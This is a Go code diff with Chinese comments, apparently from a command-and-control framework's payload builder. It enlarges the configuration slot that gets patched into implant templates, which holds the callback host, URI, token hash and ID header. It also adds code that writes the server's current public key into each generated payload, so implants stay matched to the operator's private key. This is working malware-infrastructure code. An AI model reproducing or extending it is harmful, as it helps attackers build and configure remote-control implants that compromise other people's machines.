@@ -101,7 +101,7 @@ func decryptTemplate(raw []byte) ([]byte, error) {
 
 // 配置槽布局。**必须与 C2_RUNTIME_CFG 逐字段对应**, 改字段要同时改两处并递增版本。
 const (
-	cfgSlotSize = 512
+	cfgSlotSize = 1024
 
 	offMagic     = 0
 	offVersion   = 8
@@ -117,7 +117,8 @@ const (
 	offTokenHash = 280
 	offIDHeader  = 352
 	offIDValue   = 400
-	offReserved  = 480
+	offPubkey    = 480
+	offReserved  = 756
 
 	lenHost      = 128
 	lenURI       = 64
@@ -126,9 +127,10 @@ const (
 	lenTokenHash = 72
 	lenIDHeader  = 48
 	lenIDValue   = 80
-	lenReserved  = 32
+	lenPubkey    = 276
+	lenReserved  = 268
 
-	cfgVersion = 1
+	cfgVersion = 2
 
 	flagSSL = 1 << 0
 )
@@ -146,6 +148,7 @@ type PayloadCfg struct {
 	TokenHash string // 64 位十六进制
 	IDHeader  string
 	IDValue   string
+	Pubkey    []byte // CryptoAPI PUBLICKEYBLOB(276B); 空 = 保留模板编译期公钥
 }
 
 // templateOf 把格式 ID 映射到模板文件。返回空串表示该格式没有原生支持。
@@ -316,6 +319,20 @@ func PatchConfig(tmpl []byte, cfg PayloadCfg) ([]byte, error) {
 			return nil, err
 		}
 	}
+
+	// 运行期公钥: 把服务端当前公钥写进槽位, 让载荷与服务端私钥永远同源。
+	// 空 pubkey (旧调用方 / 手工 gcc 模板) 保留模板编译期公钥, 行为向后兼容。
+	if len(cfg.Pubkey) > 0 {
+		if len(cfg.Pubkey) > lenPubkey {
+			return nil, fmt.Errorf("公钥 blob 过长: %d 字节, 上限 %d", len(cfg.Pubkey), lenPubkey)
+		}
+		dst := out[slot+offPubkey : slot+offPubkey+lenPubkey]
+		for i := range dst {
+			dst[i] = 0
+		}
+		copy(dst, cfg.Pubkey)
+	}
+
 	for i := slot + offReserved; i < slot+cfgSlotSize; i++ {
 		out[i] = 0
 	}
